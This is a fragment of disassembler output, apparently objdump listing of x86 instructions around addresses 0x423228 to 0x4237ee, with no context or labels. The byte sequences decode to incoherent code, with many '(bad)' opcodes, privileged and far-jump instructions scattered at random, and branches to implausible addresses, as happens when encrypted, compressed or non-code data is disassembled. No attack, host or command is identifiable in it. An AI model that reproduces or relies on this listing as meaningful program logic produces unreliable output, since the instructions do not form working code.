  423228:	2d 6d a4 8f 26       	sub    $0x268fa46d,%eax
  42322d:	fb                   	sti
  42322e:	cd 35                	int    $0x35
  423230:	e1 94                	loope  0x4231c6
  423232:	da 09                	fimull (%ecx)
  423234:	ea 9c 9e d5 9e 9a 7d 	ljmp   $0x7d9a,$0x9ed59e9c
  42323b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  42323c:	8d                   	lea    (bad),%esi
  42323d:	f4                   	hlt
  42323e:	cb                   	lret
  42323f:	c0 e2 be             	shl    $0xbe,%dl
  423242:	62 27                	bound  %esp,(%edi)
  423244:	10 44 28 16          	adc    %al,0x16(%eax,%ebp,1)
  423248:	2b 01                	sub    (%ecx),%eax
  42324a:	5e                   	pop    %esi
  42324b:	5d                   	pop    %ebp
  42324c:	c8 28 ab b3          	enter  $0xab28,$0xb3
  423250:	ae                   	scas   %es:(%edi),%al
  423251:	8c 29                	mov    %gs,(%ecx)
  423253:	9e                   	sahf
  423254:	bf 7c 6e 63 33       	mov    $0x33636e7c,%edi
  423259:	86 56 70             	xchg   %dl,0x70(%esi)
  42325c:	ac                   	lods   %ds:(%esi),%al
  42325d:	69 21 54 a4 80 3b    	imul   $0x3b80a454,(%ecx),%esp
  423263:	65 a9 17 05 06 cd    	gs test $0xcd060517,%eax
  423269:	31 09                	xor    %ecx,(%ecx)
  42326b:	21 8f d9 f7 b4 7f    	and    %ecx,0x7fb4f7d9(%edi)
  423271:	b7 ee                	mov    $0xee,%bh
  423273:	d4 ab                	aam    $0xab
  423275:	38 27                	cmp    %ah,(%edi)
  423277:	af                   	scas   %es:(%edi),%eax
  423278:	38 95 60 e0 54 be    	cmp    %dl,-0x41ab1fa0(%ebp)
  42327e:	81 a9 06 04 c2 ed 24 	subl   $0x9978fe24,-0x123dfbfa(%ecx)
  423285:	fe 78 99 
  423288:	72 ee                	jb     0x423278
  42328a:	9a 75 d4 7b b9 1d aa 	lcall  $0xaa1d,$0xb97bd475
  423291:	44                   	inc    %esp
  423292:	55                   	push   %ebp
  423293:	01 cd                	add    %ecx,%ebp
  423295:	91                   	xchg   %eax,%ecx
  423296:	78 35                	js     0x4232cd
  423298:	e3 53                	jecxz  0x4232ed
  42329a:	67 1d ce a0 8e e2    	addr16 sbb $0xe28ea0ce,%eax
  4232a0:	c2 ce 69             	ret    $0x69ce
  4232a3:	fa                   	cli
  4232a4:	73 6b                	jae    0x423311
  4232a6:	83 11 da             	adcl   $0xffffffda,(%ecx)
  4232a9:	20 71 57             	and    %dh,0x57(%ecx)
  4232ac:	46                   	inc    %esi
  4232ad:	0b cd                	or     %ebp,%ecx
  4232af:	e7 a1                	out    %eax,$0xa1
  4232b1:	3e 4e                	ds dec %esi
  4232b3:	16                   	push   %ss
  4232b4:	87 08                	xchg   %ecx,(%eax)
  4232b6:	17                   	pop    %ss
  4232b7:	c1 3b 52             	sarl   $0x52,(%ebx)
  4232ba:	d0 71 7e             	shlb   $1,0x7e(%ecx)
  4232bd:	70 bb                	jo     0x42327a
  4232bf:	c1 30 f7             	shll   $0xf7,(%eax)
  4232c2:	bd 0a 83 25 cb       	mov    $0xcb25830a,%ebp
  4232c7:	7e 27                	jle    0x4232f0
  4232c9:	95                   	xchg   %eax,%ebp
  4232ca:	98                   	cwtl
  4232cb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4232cc:	06                   	push   %es
  4232cd:	21 cf                	and    %ecx,%edi
  4232cf:	e5 8d                	in     $0x8d,%eax
  4232d1:	0b c7                	or     %edi,%eax
  4232d3:	5f                   	pop    %edi
  4232d4:	6d                   	insl   (%dx),%es:(%edi)
  4232d5:	d3 bb d7 cb 0c 94    	sarl   %cl,-0x6bf33429(%ebx)
  4232db:	15 43 82 17 8e       	adc    $0x8e178243,%eax
  4232e0:	f0 5e                	lock pop %esi
  4232e2:	55                   	push   %ebp
  4232e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4232e4:	69 c1 33 11 2a bd    	imul   $0xbd2a1133,%ecx,%eax
  4232ea:	9d                   	popf
  4232eb:	a9 5d 33 dc 0e       	test   $0xedc335d,%eax
  4232f0:	bc e5 ce 75 ee       	mov    $0xee75cee5,%esp
  4232f5:	be 27 59 5d a8       	mov    $0xa85d5927,%esi
  4232fa:	09 1f                	or     %ebx,(%edi)
  4232fc:	aa                   	stos   %al,%es:(%edi)
  4232fd:	c7                   	(bad)
  4232fe:	1b 1d e6 88 a8 d2    	sbb    0xd2a888e6,%ebx
  423304:	a2 19 31 67 02       	mov    %al,0x2673119
  423309:	65 0d 0f 86 61 2e    	gs or  $0x2e61860f,%eax
  42330f:	b5 b7                	mov    $0xb7,%ch
  423311:	85 e5                	test   %esp,%ebp
  423313:	46                   	inc    %esi
  423314:	3e 46                	ds inc %esi
  423316:	62 a7 4a c4 0e 7f    	bound  %esp,0x7f0ec44a(%edi)
  42331c:	fc                   	cld
  42331d:	00 f1                	add    %dh,%cl
  42331f:	b9 ec a2 76 f2       	mov    $0xf276a2ec,%ecx
  423324:	fb                   	sti
  423325:	39 9c 81 3d 15 41 64 	cmp    %ebx,0x6441153d(%ecx,%eax,4)
  42332c:	c2 f6 b2             	ret    $0xb2f6
  42332f:	62 6a 80             	bound  %ebp,-0x80(%edx)
  423332:	92                   	xchg   %eax,%edx
  423333:	c2 29 97             	ret    $0x9729
  423336:	a3 45 fd 4a 70       	mov    %eax,0x704afd45
  42333b:	ae                   	scas   %es:(%edi),%al
  42333c:	ea b3 77 ac 17 c6 6e 	ljmp   $0x6ec6,$0x17ac77b3
  423343:	a1 c6 2c 2e 09       	mov    0x92e2cc6,%eax
  423348:	16                   	push   %ss
  423349:	b5 a1                	mov    $0xa1,%ch
  42334b:	a9 53 4c 63 fa       	test   $0xfa634c53,%eax
  423350:	68 47 8e 77 5a       	push   $0x5a778e47
  423355:	80 e2 b5             	and    $0xb5,%dl
  423358:	1c 94                	sbb    $0x94,%al
  42335a:	80 1e bc             	sbbb   $0xbc,(%esi)
  42335d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  42335e:	24 96                	and    $0x96,%al
  423360:	d0 21                	shlb   $1,(%ecx)
  423362:	a9 3b cf 36 76       	test   $0x7636cf3b,%eax
  423367:	32 f9                	xor    %cl,%bh
  423369:	ad                   	lods   %ds:(%esi),%eax
  42336a:	60                   	pusha
  42336b:	89 eb                	mov    %ebp,%ebx
  42336d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  42336e:	92                   	xchg   %eax,%edx
  42336f:	40                   	inc    %eax
  423370:	15 1c 9c cc 39       	adc    $0x39cc9c1c,%eax
  423375:	55                   	push   %ebp
  423376:	80 48 2f 7c          	orb    $0x7c,0x2f(%eax)
  42337a:	56                   	push   %esi
  42337b:	83 dd 97             	sbb    $0xffffff97,%ebp
  42337e:	64 aa                	fs stos %al,%es:(%edi)
  423380:	f3 be 7a cd b2 4f    	repz mov $0x4fb2cd7a,%esi
  423386:	d6                   	salc
  423387:	6a 59                	push   $0x59
  423389:	86 e0                	xchg   %ah,%al
  42338b:	61                   	popa
  42338c:	6b 5d f2 18          	imul   $0x18,-0xe(%ebp),%ebx
  423390:	75 14                	jne    0x4233a6
  423392:	fc                   	cld
  423393:	57                   	push   %edi
  423394:	87 80 20 91 8f a4    	xchg   %eax,-0x5b706ee0(%eax)
  42339a:	16                   	push   %ss
  42339b:	b8 5d 3f c4 13       	mov    $0x13c43f5d,%eax
  4233a0:	73 06                	jae    0x4233a8
  4233a2:	fa                   	cli
  4233a3:	fa                   	cli
  4233a4:	01 e9                	add    %ebp,%ecx
  4233a6:	bb 83 39 de a0       	mov    $0xa0de3983,%ebx
  4233ab:	da 2b                	fisubrl (%ebx)
  4233ad:	15 92 11 15 cc       	adc    $0xcc151192,%eax
  4233b2:	9c                   	pushf
  4233b3:	e8 07 8b 8e 34       	call   0x34d0bebf
  4233b8:	2f                   	das
  4233b9:	2d 96 00 1d f4       	sub    $0xf41d0096,%eax
  4233be:	64 fb                	fs sti
  4233c0:	f3 cf                	repz iret
  4233c2:	7a a2                	jp     0x423366
  4233c4:	e1 b6                	loope  0x42337c
  4233c6:	08 85 c4 d7 20 12    	or     %al,0x1220d7c4(%ebp)
  4233cc:	ab                   	stos   %eax,%es:(%edi)
  4233cd:	2e 32 c9             	cs xor %cl,%cl
  4233d0:	b5 a5                	mov    $0xa5,%ch
  4233d2:	3c 80                	cmp    $0x80,%al
  4233d4:	87 bc 0e 3f 91 00 d6 	xchg   %edi,-0x29ff6ec1(%esi,%ecx,1)
  4233db:	c8 9f db bc          	enter  $0xdb9f,$0xbc
  4233df:	2d 2c e2 b9 22       	sub    $0x22b9e22c,%eax
  4233e4:	52                   	push   %edx
  4233e5:	c1 24 6f ec          	shll   $0xec,(%edi,%ebp,2)
  4233e9:	7c 72                	jl     0x42345d
  4233eb:	08 92 15 59 ee 08    	or     %dl,0x8ee5915(%edx)
  4233f1:	0e                   	push   %cs
  4233f2:	81 12 1a d4 92 ca    	adcl   $0xca92d41a,(%edx)
  4233f8:	e3 81                	jecxz  0x42337b
  4233fa:	85 ad 39 b8 c5 44    	test   %ebp,0x44c5b839(%ebp)
  423400:	48                   	dec    %eax
  423401:	9d                   	popf
  423402:	48                   	dec    %eax
  423403:	01 c3                	add    %eax,%ebx
  423405:	4d                   	dec    %ebp
  423406:	5a                   	pop    %edx
  423407:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  423408:	d5 9b                	aad    $0x9b
  42340a:	a2 31 59 dd f9       	mov    %al,0xf9dd5931
  42340f:	e8 73 f4 a3 4d       	call   0x4de62887
  423414:	8b 2b                	mov    (%ebx),%ebp
  423416:	01 31                	add    %esi,(%ecx)
  423418:	9e                   	sahf
  423419:	b3 17                	mov    $0x17,%bl
  42341b:	b6 61                	mov    $0x61,%dh
  42341d:	62                   	(bad)
  42341e:	c0 0f cd             	rorb   $0xcd,(%edi)
  423421:	1a 8d 25 0c fd c8    	sbb    -0x3702f3db(%ebp),%cl
  423427:	4e                   	dec    %esi
  423428:	47                   	inc    %edi
  423429:	71 de                	jno    0x423409
  42342b:	00 55 60             	add    %dl,0x60(%ebp)
  42342e:	20 93 87 be 3a 4a    	and    %dl,0x4a3abe87(%ebx)
  423434:	40                   	inc    %eax
  423435:	52                   	push   %edx
  423436:	d4 ad                	aam    $0xad
  423438:	08 12                	or     %dl,(%edx)
  42343a:	81 15 1a 50 93 62 df 	adcl   $0xe9f2c5df,0x6293501a
  423441:	c5 f2 e9 
  423444:	b7 fe                	mov    $0xfe,%bh
  423446:	54                   	push   %esp
  423447:	82 f0 5c             	xor    $0x5c,%al
  42344a:	49                   	dec    %ecx
  42344b:	97                   	xchg   %eax,%edi
  42344c:	c3                   	ret
  42344d:	5e                   	pop    %esi
  42344e:	5a                   	pop    %edx
  42344f:	2e dd 0b             	fisttpll %cs:(%ebx)
  423452:	9e                   	sahf
  423453:	74 a4                	je     0x4233f9
  423455:	18 ee                	sbb    %ch,%dh
  423457:	2f                   	das
  423458:	06                   	push   %es
  423459:	33 b4 0c 8b c2 01 b0 	xor    -0x4ffe3d75(%esp,%ecx,1),%esi
  423460:	86 31                	xchg   %dh,(%ecx)
  423462:	1f                   	pop    %ds
  423463:	59                   	pop    %ecx
  423464:	5d                   	pop    %ebp
  423465:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  423466:	10 49 85             	adc    %cl,-0x7b(%ecx)
  423469:	5d                   	pop    %ebp
  42346a:	11 60 aa             	adc    %esp,-0x56(%eax)
  42346d:	bc c8 19 4f 9a       	mov    $0x9a4f19c8,%esp
  423472:	c6 83 5d fe 1c d9 4b 	movb   $0x4b,-0x26e301a3(%ebx)
  423479:	f6 eb                	imul   %bl
  42347b:	82 2f 9f             	subb   $0x9f,(%edi)
  42347e:	be 6c 78 21 81       	mov    $0x8121786c,%esi
  423483:	d5 0a                	aad    $0xa
  423485:	95                   	xchg   %eax,%ebp
  423486:	93                   	xchg   %eax,%ebx
  423487:	b1 db                	mov    $0xdb,%cl
  423489:	0a 99 27 8a 32 2d    	or     0x2d328a27(%ecx),%bl
  42348f:	ce                   	into
  423490:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  423491:	1b b8 66 c3 01 4a    	sbb    0x4a01c366(%eax),%edi
  423497:	60                   	pusha
  423498:	d5 42                	aad    $0x42
  42349a:	9a bb 00 57 b2 62 c0 	lcall  $0xc062,$0xb25700bb
  4234a1:	7d 54                	jge    0x4234f7
  4234a3:	cb                   	lret
  4234a4:	f8                   	clc
  4234a5:	05 01 3e 8e c0       	add    $0xc08e3e01,%eax
  4234aa:	17                   	pop    %ss
  4234ab:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4234ac:	59                   	pop    %ecx
  4234ad:	e8 4d 85 c7 91       	call   0x9209b9ff
  4234b2:	76 a2                	jbe    0x423456
  4234b4:	ff                   	(bad)
  4234b5:	7b 39                	jnp    0x4234f0
  4234b7:	0a 46 df             	or     -0x21(%esi),%al
  4234ba:	cf                   	iret
  4234bb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4234bc:	54                   	push   %esp
  4234bd:	c0 18 18             	rcrb   $0x18,(%eax)
  4234c0:	9b                   	fwait
  4234c1:	35 d8 c0 4e d3       	xor    $0xd34ec0d8,%eax
  4234c6:	fe                   	(bad)
  4234c7:	2b 7f fd             	sub    -0x3(%edi),%edi
  4234ca:	86 c1                	xchg   %al,%cl
  4234cc:	0d ec 94 fb d7       	or     $0xd7fb94ec,%eax
  4234d1:	48                   	dec    %eax
  4234d2:	24 64                	and    $0x64,%al
  4234d4:	8a 77 08             	mov    0x8(%edi),%dh
  4234d7:	03 ad da be b9 c5    	add    -0x3a464126(%ebp),%ebp
  4234dd:	2b 4c 31 cb          	sub    -0x35(%ecx,%esi,1),%ecx
  4234e1:	b2 96                	mov    $0x96,%dl
  4234e3:	ff 48 93             	decl   -0x6d(%eax)
  4234e6:	ec                   	in     (%dx),%al
  4234e7:	a0 13 b4 81 8a       	mov    0x8a81b413,%al
  4234ec:	fa                   	cli
  4234ed:	b5 03                	mov    $0x3,%ch
  4234ef:	b0 84                	mov    $0x84,%al
  4234f1:	37                   	aaa
  4234f2:	0c 6e                	or     $0x6e,%al
  4234f4:	55                   	push   %ebp
  4234f5:	2e 7d 3d             	jge,pn 0x423535
  4234f8:	36 d1 dc             	ss rcr $1,%esp
  4234fb:	e4 40                	in     $0x40,%al
  4234fd:	3a 3a                	cmp    (%edx),%bh
  4234ff:	66 bd 76 c4          	mov    $0xc476,%bp
  423503:	65 4f                	gs dec %edi
  423505:	83 14 5e 9e          	adcl   $0xffffff9e,(%esi,%ebx,2)
  423509:	6d                   	insl   (%dx),%es:(%edi)
  42350a:	da 02                	fiaddl (%edx)
  42350c:	73 17                	jae    0x423525
  42350e:	f3 ea 76 4a ff a0 04 	repz ljmp $0x8f04,$0xa0ff4a76
  423515:	8f 
  423516:	8d a0 d3 8a dc 9e    	lea    -0x6123752d(%eax),%esp
  42351c:	98                   	cwtl
  42351d:	b3 2d                	mov    $0x2d,%bl
  42351f:	47                   	inc    %edi
  423520:	c3                   	ret
  423521:	99                   	cltd
  423522:	b7 b8                	mov    $0xb8,%bh
  423524:	3c cb                	cmp    $0xcb,%al
  423526:	45                   	inc    %ebp
  423527:	d1 ca                	ror    $1,%edx
  423529:	1f                   	pop    %ds
  42352a:	92                   	xchg   %eax,%edx
  42352b:	3b eb                	cmp    %ebx,%ebp
  42352d:	cf                   	iret
  42352e:	4c                   	dec    %esp
  42352f:	e2 c1                	loop   0x4234f2
  423531:	f6 4e 49 f5          	testb  $0xf5,0x49(%esi)
  423535:	85 7c a2 83          	test   %edi,-0x7d(%edx,%eiz,4)
  423539:	48                   	dec    %eax
  42353a:	0a 53 51             	or     0x51(%ebx),%dl
  42353d:	6b 63 7e ec          	imul   $0xffffffec,0x7e(%ebx),%esp
  423541:	12 41 25             	adc    0x25(%ecx),%al
  423544:	f6 f9                	idiv   %cl
  423546:	34 99                	xor    $0x99,%al
  423548:	bb af c2 40 49       	mov    $0x4940c2af,%ebx
  42354d:	2b 10                	sub    (%eax),%edx
  42354f:	9b                   	fwait
  423550:	c6                   	(bad)
  423551:	ae                   	scas   %es:(%edi),%al
  423552:	57                   	push   %edi
  423553:	42                   	inc    %edx
  423554:	8f                   	(bad)
  423555:	55                   	push   %ebp
  423556:	3a 29                	cmp    (%ecx),%ch
  423558:	73 b0                	jae    0x42350a
  42355a:	fa                   	cli
  42355b:	d6                   	salc
  42355c:	01 e3                	add    %esp,%ebx
  42355e:	88 a1 b1 02 a9 e1    	mov    %ah,-0x1e56fd4f(%ecx)
  423564:	0e                   	push   %cs
  423565:	f7 2b                	imull  (%ebx)
  423567:	bf 24 ac bd 6c       	mov    $0x6cbdac24,%edi
  42356c:	1b b0 58 5c c9 68    	sbb    0x68c95c58(%eax),%esi
  423572:	4e                   	dec    %esi
  423573:	75 15                	jne    0x42358a
  423575:	75 53                	jne    0x4235ca
  423577:	45                   	inc    %ebp
  423578:	ec                   	in     (%dx),%al
  423579:	6a 65                	push   $0x65
  42357b:	91                   	xchg   %eax,%ecx
  42357c:	fe                   	(bad)
  42357d:	1c 2c                	sbb    $0x2c,%al
  42357f:	e0 b1                	loopne 0x423532
  423581:	8c 4e 99             	mov    %cs,-0x67(%esi)
  423584:	34 a5                	xor    $0xa5,%al
  423586:	d4 18                	aam    $0x18
  423588:	94                   	xchg   %eax,%esp
  423589:	ab                   	stos   %eax,%es:(%edi)
  42358a:	2d b8 a6 b9 3f       	sub    $0x3fb9a6b8,%eax
  42358f:	c9                   	leave
  423590:	82 2b 21             	subb   $0x21,(%ebx)
  423593:	45                   	inc    %ebp
  423594:	4b                   	dec    %ebx
  423595:	af                   	scas   %es:(%edi),%eax
  423596:	c2 66 5d             	ret    $0x5d66
  423599:	2d 73 8f f2 9a       	sub    $0x9af28f73,%eax
  42359e:	15 a6 52 b6 36       	adc    $0x36b652a6,%eax
  4235a3:	60                   	pusha
  4235a4:	70 63                	jo     0x423609
  4235a6:	89 0d 06 67 9f dd    	mov    %ecx,0xdd9f6706
  4235ac:	71 3d                	jno    0x4235eb
  4235ae:	fd                   	std
  4235af:	c9                   	leave
  4235b0:	72 da                	jb     0x42358c
  4235b2:	ef                   	out    %eax,(%dx)
  4235b3:	e6 f5                	out    %al,$0xf5
  4235b5:	48                   	dec    %eax
  4235b6:	b1 39                	mov    $0x39,%cl
  4235b8:	ce                   	into
  4235b9:	3d 47 39 dc 8d       	cmp    $0x8ddc3947,%eax
  4235be:	ad                   	lods   %ds:(%esi),%eax
  4235bf:	6d                   	insl   (%dx),%es:(%edi)
  4235c0:	30 79 bb             	xor    %bh,-0x45(%ecx)
  4235c3:	0a 3a                	or     (%edx),%bh
  4235c5:	16                   	push   %ss
  4235c6:	b4 eb                	mov    $0xeb,%ah
  4235c8:	f6 fd                	idiv   %ch
  4235ca:	0e                   	push   %cs
  4235cb:	fc                   	cld
  4235cc:	85 f5                	test   %esi,%ebp
  4235ce:	1c 3c                	sbb    $0x3c,%al
  4235d0:	87 9c 14 af a7 bb 50 	xchg   %ebx,0x50bba7af(%esp,%edx,1)
  4235d7:	46                   	inc    %esi
  4235d8:	73 3d                	jae    0x423617
  4235da:	36 29 4d 57          	sub    %ecx,%ss:0x57(%ebp)
  4235de:	c4 52 43             	les    0x43(%edx),%edx
  4235e1:	ec                   	in     (%dx),%al
  4235e2:	6c                   	insb   (%dx),%es:(%edi)
  4235e3:	cc                   	int3
  4235e4:	e8 df 4a eb cb       	call   0xcc2d80c8
  4235e9:	f6 32                	divb   (%edx)
  4235eb:	14 75                	adc    $0x75,%al
  4235ed:	31 8c 30 0b b4 82 9c 	xor    %ecx,-0x637d4bf5(%eax,%esi,1)
  4235f4:	fd                   	std
  4235f5:	63 41 0f             	arpl   %eax,0xf(%ecx)
  4235f8:	fb                   	sti
  4235f9:	1a 78 26             	sbb    0x26(%eax),%bh
  4235fc:	f1                   	int1
  4235fd:	f4                   	hlt
  4235fe:	b4 fb                	mov    $0xfb,%ah
  423600:	34 fb                	xor    $0xfb,%al
  423602:	4d                   	dec    %ebp
  423603:	f7 c6 4c 53 94 db    	test   $0xdb94534c,%esi
  423609:	b8 18 4d 9d 51       	mov    $0x519d4d18,%eax
  42360e:	30 03                	xor    %al,(%ebx)
  423610:	fc                   	cld
  423611:	69 75 4b 8e 72 78 24 	imul   $0x2478728e,0x4b(%ebp),%esi
  423618:	53                   	push   %ebx
  423619:	81 11 aa aa b7 23    	adcl   $0x23b7aaaa,(%ecx)
  42361f:	3e a4                	movsb  %ds:(%esi),%es:(%edi)
  423621:	5d                   	pop    %ebp
  423622:	9f                   	lahf
  423623:	bb 1f 4f 50 53       	mov    $0x53504f1f,%ebx
  423628:	c2 60 12             	ret    $0x1260
  42362b:	84 52 e4             	test   %dl,-0x1c(%edx)
  42362e:	eb d6                	jmp    0x423606
  423630:	6c                   	insb   (%dx),%es:(%edi)
  423631:	d1 e5                	shl    $1,%ebp
  423633:	0d 97 eb 2a ff       	or     $0xff2aeb97,%eax
  423638:	c9                   	leave
  423639:	8c 4a 90             	mov    %cs,-0x70(%edx)
  42363c:	d1 94 92 71 15 78 ac 	rcll   $1,-0x5387ea8f(%edx,%edx,4)
  423643:	4e                   	dec    %esi
  423644:	27                   	daa
  423645:	bc 95 1a 2b 29       	mov    $0x292b1a95,%esp
  42364a:	45                   	inc    %ebp
  42364b:	3d b7 c1 90 a8       	cmp    $0xa890c1b7,%eax
  423650:	dd 82 54 e3 ef ce    	fldl   -0x31101cac(%edx)
  423656:	66 6c                	data16 insb (%dx),%es:(%edi)
  423658:	b3 4a                	mov    $0x4a,%bl
  42365a:	cc                   	int3
  42365b:	59                   	pop    %ecx
  42365c:	31 6d a8             	xor    %ebp,-0x58(%ebp)
  42365f:	70 4f                	jo     0x4236b0
  423661:	81 1c a7 97 cf 2e 1b 	sbbl   $0x1b2ecf97,(%edi,%eiz,4)
  423668:	a1 1c 0c e6 8c       	mov    0x8ce60c1c,%eax
  42366d:	8a de                	mov    %dh,%bl
  42366f:	9e                   	sahf
  423670:	54                   	push   %esp
  423671:	a3 0e b3 5c 55       	mov    %eax,0x555cb30e
  423676:	d5 2a                	aad    $0x2a
  423678:	6a c0                	push   $0xffffffc0
  42367a:	e3 cc                	jecxz  0x423648
  42367c:	df 16                	fists  (%esi)
  42367e:	50                   	push   %eax
  42367f:	3a dd                	cmp    %ch,%bl
  423681:	cf                   	iret
  423682:	15 d3 cd 64 9d       	adc    $0x9d64cdd3,%eax
  423687:	03 12                	add    (%edx),%edx
  423689:	6d                   	insl   (%dx),%es:(%edi)
  42368a:	ab                   	stos   %eax,%es:(%edi)
  42368b:	4a                   	dec    %edx
  42368c:	20 7b 67             	and    %bh,0x67(%ebx)
  42368f:	46                   	inc    %esi
  423690:	fa                   	cli
  423691:	6b 79 7f ff          	imul   $0xffffffff,0x7f(%ecx),%edi
  423695:	02 8c 36 db 25 52 c1 	add    -0x3eadda25(%esi,%esi,1),%cl
  42369c:	e9 a1 60 2b 9c       	jmp    0x9c6d9742
  4236a1:	f7 1a                	negl   (%edx)
  4236a3:	9a 9a ae 65 b1 4b 1f 	lcall  $0x1f4b,$0xb165ae9a
  4236aa:	1a 25 91 c7 28 af    	sbb    0xaf28c791,%ah
  4236b0:	af                   	scas   %es:(%edi),%eax
  4236b1:	db 8c 26 31 ca c5 dd 	fisttpl -0x223a35cf(%esi,%eiz,1)
  4236b8:	82 e1 0a             	and    $0xa,%cl
  4236bb:	ce                   	into
  4236bc:	56                   	push   %esi
  4236bd:	98                   	cwtl
  4236be:	df a6 58 cf e1 8b    	fbld   -0x741e30a8(%esi)
  4236c4:	1e                   	push   %ds
  4236c5:	59                   	pop    %ecx
  4236c6:	98                   	cwtl
  4236c7:	75 1d                	jne    0x4236e6
  4236c9:	02 dd                	add    %ch,%bl
  4236cb:	1e                   	push   %ds
  4236cc:	49                   	dec    %ecx
  4236cd:	66 97                	xchg   %ax,%di
  4236cf:	7d 10                	jge    0x4236e1
  4236d1:	72 99                	jb     0x42366c
  4236d3:	73 9f                	jae    0x423674
  4236d5:	e5 6c                	in     $0x6c,%eax
  4236d7:	b4 35                	mov    $0x35,%ah
  4236d9:	92                   	xchg   %eax,%edx
  4236da:	bc ac c7 5a 4e       	mov    $0x4e5ac7ac,%esp
  4236df:	9c                   	pushf
  4236e0:	c1 76 5e 05          	shll   $0x5,0x5e(%esi)
  4236e4:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4236e5:	11 10                	adc    %edx,(%eax)
  4236e7:	2c ab                	sub    $0xab,%al
  4236e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4236ea:	74 6d                	je     0x423759
  4236ec:	ff 57 06             	call   *0x6(%edi)
  4236ef:	50                   	push   %eax
  4236f0:	35 91 ce 10 93       	xor    $0x9310ce91,%eax
  4236f5:	39 1a                	cmp    %ebx,(%edx)
  4236f7:	c2 a5 a5             	ret    $0xa5a5
  4236fa:	2c ad                	sub    $0xad,%al
  4236fc:	4b                   	dec    %ebx
  4236fd:	07                   	pop    %es
  4236fe:	cc                   	int3
  4236ff:	12 5d 2e             	adc    0x2e(%ebp),%bl
  423702:	1e                   	push   %ds
  423703:	3a 0d 04 d2 26 5d    	cmp    0x5d26d204,%cl
  423709:	db e7                	(bad)
  42370b:	ad                   	lods   %ds:(%esi),%eax
  42370c:	f7 82 30 ad 72 53 fb 	testl  $0x620049fb,0x5372ad30(%edx)
  423713:	49 00 62 
  423716:	89 bf 17 17 e4 23    	mov    %edi,0x23e41717(%edi)
  42371c:	58                   	pop    %eax
  42371d:	3c db                	cmp    $0xdb,%al
  42371f:	c8 ef 84 b3          	enter  $0x84ef,$0xb3
  423723:	a9 38 d0 41 cb       	test   $0xcb41d038,%eax
  423728:	ce                   	into
  423729:	6f                   	outsl  %ds:(%esi),(%dx)
  42372a:	15 47 99 53 da       	adc    $0xda539947,%eax
  42372f:	6c                   	insb   (%dx),%es:(%edi)
  423730:	54                   	push   %esp
  423731:	78 ae                	js     0x4236e1
  423733:	b4 f0                	mov    $0xf0,%ah
  423735:	ba 79 ae 86 59       	mov    $0x5986ae79,%edx
  42373a:	0f 1e 16             	nopl   (%esi)
  42373d:	f7 9a 80 63 9c d1    	negl   -0x2e639c80(%edx)
  423743:	a9 ed b2 31 bf       	test   $0xbf31b2ed,%eax
  423748:	be ba c7 ad c1       	mov    $0xc1adc7ba,%esi
  42374d:	13 10                	adc    (%eax),%edx
  42374f:	e2 52                	loop   0x4237a3
  423751:	0c da                	or     $0xda,%al
  423753:	fa                   	cli
  423754:	61                   	popa
  423755:	f0 e8 30 75 87 fa    	lock call 0xfac9ac8b
  42375b:	93                   	xchg   %eax,%ebx
  42375c:	64 ae                	fs scas %es:(%edi),%al
  42375e:	df ba cf 11 92 d2    	fistpll -0x2d6dee31(%edx)
  423764:	19 c8                	sbb    %ecx,%eax
  423766:	a0 ab 2f df 2f       	mov    0x2fdf2fab,%al
  42376b:	37                   	aaa
  42376c:	bf c2 c0 de 29       	mov    $0x29dec0c2,%edi
  423771:	ea 8e 61 d1 42 58 78 	ljmp   $0x7858,$0x42d1618e
  423778:	e7 77                	out    %eax,$0x77
  42377a:	6e                   	outsb  %ds:(%esi),(%dx)
  42377b:	8f                   	(bad)
  42377c:	34 67                	xor    $0x67,%al
  42377e:	52                   	push   %edx
  42377f:	75 db                	jne    0x42375c
  423781:	09 15 1e 4d 3f 17    	or     %edx,0x173f4d1e
  423787:	99                   	cltd
  423788:	98                   	cwtl
  423789:	8f                   	(bad)
  42378a:	21 a4 aa 3f 91 91 54 	and    %esp,0x5491913f(%edx,%ebp,4)
  423791:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  423792:	e8 ba 8c 4e 0c       	call   0xc90c451
  423797:	5d                   	pop    %ebp
  423798:	51                   	push   %ecx
  423799:	5c                   	pop    %esp
  42379a:	d8 29                	fsubrs (%ecx)
  42379c:	63 69 ea             	arpl   %ebp,-0x16(%ecx)
  42379f:	ef                   	out    %eax,(%dx)
  4237a0:	2c c0                	sub    $0xc0,%al
  4237a2:	62                   	(bad)
  4237a3:	d4 a1                	aam    $0xa1
  4237a5:	eb 47                	jmp    0x4237ee
  4237a7:	ff cb                	dec    %ebx
  4237a9:	bd 93 b3 18 ce       	mov    $0xce18b393,%ebp
  4237ae:	a1 3f 26 9e fe       	mov    0xfe9e263f,%eax
  4237b3:	73 f6                	jae    0x4237ab
  4237b5:	04 de                	add    $0xde,%al
  4237b7:	19 41 2d             	sbb    %eax,0x2d(%ecx)
  4237ba:	ea 34 d1 39 58 01 a9 	ljmp   $0xa901,$0x5839d134
  4237c1:	f5                   	cmc
  4237c2:	e3 11                	jecxz  0x4237d5
  4237c4:	42                   	inc    %edx
  4237c5:	63 be 9a d2 46 26    	arpl   %edi,0x2646d29a(%esi)
  4237cb:	53                   	push   %ebx
  4237cc:	f0 7f 91             	lock jg 0x423760
  4237cf:	c3                   	ret
  4237d0:	98                   	cwtl
  4237d1:	f2 11 01             	repnz adc %eax,(%ecx)
  4237d4:	ab                   	stos   %eax,%es:(%edi)
  4237d5:	28 22                	sub    %ah,(%edx)
  4237d7:	a3 73 eb 5f f6       	mov    %eax,0xf65feb73
  4237dc:	19 82 85 ae 31 63    	sbb    %eax,0x6331ae85(%edx)
  4237e2:	da 1e                	ficompl (%esi)
  4237e4:	51                   	push   %ecx
  4237e5:	0e                   	push   %cs
  4237e6:	14 61                	adc    $0x61,%al
  4237e8:	52                   	push   %edx
  4237e9:	0a c6                	or     %dh,%al
  4237eb:	d5 72                	aad    $0x72
  4237ed:	61                   	popa
  4237ee:	8b 2a                	mov    (%edx),%ebp
